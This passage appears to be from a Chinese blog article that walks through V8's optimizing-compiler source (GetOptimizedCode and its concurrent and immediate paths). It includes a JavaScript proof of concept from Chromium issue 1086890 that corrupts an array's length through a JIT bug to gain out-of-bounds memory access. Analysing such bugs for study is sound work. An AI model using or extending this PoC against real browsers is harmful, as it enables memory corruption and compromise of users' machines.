@@ -1,0 +1,133 @@
+    4.                                     JavaScriptFrame* osr_frame = nullptr) {
+    5.  //省略..............
+    6.    if (V8_UNLIKELY(FLAG_testing_d8_test_runner)) {
+    7.      PendingOptimizationTable::FunctionWasOptimized(isolate, function);
+    8.    }
+    9.    Handle cached_code;
+    10.    if (GetCodeFromOptimizedCodeCache(function, osr_offset)
+    11.            .ToHandle(&cached_code)) {
+    12.      if (FLAG_trace_opt) {
+    13.        CodeTracer::Scope scope(isolate->GetCodeTracer());
+    14.        PrintF(scope.file(), "[found optimized code for ");
+    15.        function->ShortPrint(scope.file());
+    16.        if (!osr_offset.IsNone()) {
+    17.          PrintF(scope.file(), " at OSR AST id %d", osr_offset.ToInt());
+    18.        }
+    19.        PrintF(scope.file(), "]\n");
+    20.      }
+    21.      return cached_code;
+    22.    }
+    23.    DCHECK(shared->is_compiled());
+    24.    function->feedback_vector().set_profiler_ticks(0);
+    25.    VMState state(isolate);
+    26.    TimerEventScope optimize_code_timer(isolate);
+    27.    RuntimeCallTimerScope runtimeTimer(isolate,
+    28.                                       RuntimeCallCounterId::kOptimizeCode);
+    29.    TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT("v8.compile"), "V8.OptimizeCode");
+    30.    DCHECK(!isolate->has_pending_exception());
+    31.    PostponeInterruptsScope postpone(isolate);
+    32.    bool has_script = shared->script().IsScript();
+    33.    DCHECK_IMPLIES(!has_script, shared->HasBytecodeArray());
+    34.    std::unique_ptr job(
+    35.        compiler::Pipeline::NewCompilationJob(isolate, function, has_script,
+    36.                                              osr_offset, osr_frame));
+    37.    OptimizedCompilationInfo* compilation_info = job->compilation_info();
+    38.    if (compilation_info->shared_info()->HasBreakInfo()) {
+    39.      compilation_info->AbortOptimization(BailoutReason::kFunctionBeingDebugged);
+    40.      return MaybeHandle();
+    41.    }
+    42.    if (!FLAG_opt || !shared->PassesFilter(FLAG_turbo_filter)) {
+    43.      compilation_info->AbortOptimization(BailoutReason::kOptimizationDisabled);
+    44.      return MaybeHandle();
+    45.    }
+    46.    base::Optional compilation;
+    47.    if (mode == ConcurrencyMode::kConcurrent) {
+    48.      compilation.emplace(isolate, compilation_info);
+    49.    }
+    50.    CanonicalHandleScope canonical(isolate);
+    51.    compilation_info->ReopenHandlesInNewHandleScope(isolate);
+    52.    if (mode == ConcurrencyMode::kConcurrent) {
+    53.      if (GetOptimizedCodeLater(job.get(), isolate)) {
+    54.        job.release(); 
+    55.        function->SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);
+    56.        DCHECK(function->IsInterpreted() ||
+    57.               (!function->is_compiled() && function->shared().IsInterpreted()));
+    58.        DCHECK(function->shared().HasBytecodeArray());
+    59.        return BUILTIN_CODE(isolate, InterpreterEntryTrampoline);
+    60.      }
+    61.    } else {
+    62.      if (GetOptimizedCodeNow(job.get(), isolate))
+    63.        return compilation_info->code();
+    64.    }
+    65.    if (isolate->has_pending_exception()) isolate->clear_pending_exception();
+    66.    return MaybeHandle();
+    67.  }
+上述代码中，第 10-22 行查询 CodeCache，如果命中则直接返回结果；  
+第 24 行重置 feedback_vector，因为该函数即将被优化编译，不再需要做热点统计；  
+第 34-37 行创建优化编译的实例对象 job；  
+第 37-50 行判断 Flag、记录编译方式（Concurrent 或 NotConcurrent）；  
+第 52 行根据编译方式的不同，选择现在编译（GetOptimizedCodeNow）或稍后编译（GetOptimizedCodeLater）；  
+第 59 行返回 BUILTIN_CODE(isolate, InterpreterEntryTrampoline)，因为是稍后编译，也就是
+Concurrent 方式，当下的解释执行不能停，所以才有这样的返回结果；  
+第 62 行此时为 NotConcurrent，所以第 63 行代码返回编译后的 code。  
+简单说明 GetOptimizedCodeNow 的工作流程，源码如下:
+     1.  bool GetOptimizedCodeNow(OptimizedCompilationJob* job, Isolate* isolate) {
+    1.    TimerEventScope timer(isolate);
+    2.    if (job->PrepareJob(isolate) != CompilationJob::SUCCEEDED ||
+    3.        job->ExecuteJob(isolate->counters()->runtime_call_stats()) !=
+    4.            CompilationJob::SUCCEEDED ||
+    5.        job->FinalizeJob(isolate) != CompilationJob::SUCCEEDED) {
+    6.    // 省略........
+    7.      return false;
+    8.    }
+    9.     // 省略........
+    10.    return true;
+    11.  }
+上述代码与 Bytecode 的编译过程相似，也分为三部分：1. PrepareJob；2. ExecuteJob；3. FinalizeJob。  
+PrepareJob 负责编译前的准备工作；  
+ExecuteJob 负责所有编译工作；  
+FinalizeJob 负责把编译结果（code）安装到 SharedFunction 中、更新 CodeCache 等收尾工作。  
+GetOptimizedCodeLater 的工作流程是：将编译任务 Job 放进了编译分发（dispatch）队列，待编译完成后会设置相应的
+SharedFunction 状态。
+## 4 Concurrent 测试用例
+源码如下：
+    1.  array = Array(0x40000).fill(1.1);
+    2.  args = Array(0x100 - 1).fill(array);
+    3.  args.push(Array(0x40000 - 4).fill(2.2));
+    4.  giant_array = Array.prototype.concat.apply([], args);
+    5.  giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
+    6.  length_as_double =
+    7.      new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];
+    8.  function trigger(array) {
+    9.    var x = array.length;
+    10.    x -= 67108861;
+    11.    x = Math.max(x, 0);
+    12.    x *= 6;
+    13.    x -= 5;
+    14.    x = Math.max(x, 0);
+    15.    let corrupting_array = [0.1, 0.1];
+    16.    let corrupted_array = [0.1];
+    17.    corrupting_array[x] = length_as_double;
+    18.    return [corrupting_array, corrupted_array];
+    19.  }
+    20.  //console.log(length_as_double);
+    21.  for (let i = 0; i < 30000; ++i) {
+    22.    trigger(giant_array);
+    23.  }
+    24.  //console.log(length_as_double);
+    25.  corrupted_array = trigger(giant_array)[1];
+    26.  //%DebugPrint(corrupted_array);
+    27.  console.log('Now corrupted array length: ' + corrupted_array.length.toString(16));
+    28.  corrupted_array[0x123456];
+上述代码来自 chromium issue 1086890。  
+第 8 行代码 trigger() 创建并返回数组，第 21 行代码循环执行 trigger() 会触发
+Runtime_CompileOptimized_Concurrent 方法。函数调用堆栈如图 1 所示。
+## 新文章介绍
+**《Chrome V8 Bug》** 系列文章即将上线。  
+《Chrome V8 Bug》系列文章的目的是解释漏洞的产生原因，并向你展示这些漏洞如何影响 V8
+的正确性。其他的漏洞文章大多从安全研究的角度分析，讲述如何设计与使用 PoC。而本系列文章是从源码研究的角度来写的，分析 PoC 在 V8
+中的执行细节，讲解为什么 Poc 要这样设计。当然，学习 Poc 的设计与使用，是 V8 安全研究的很好的出发点，所以，对于希望深入学习 V8 源码和
+PoC 原理的人来说，本系列文章也是很有价值的介绍性读物。
+好了，今天到这里，下次见。  
+ **个人能力有限，有不足与纰漏，欢迎批评指正**  
+ **微信：qq9123013 备注：v8交流 邮箱：[PI:EMAIL](mailto:PI:EMAIL)**
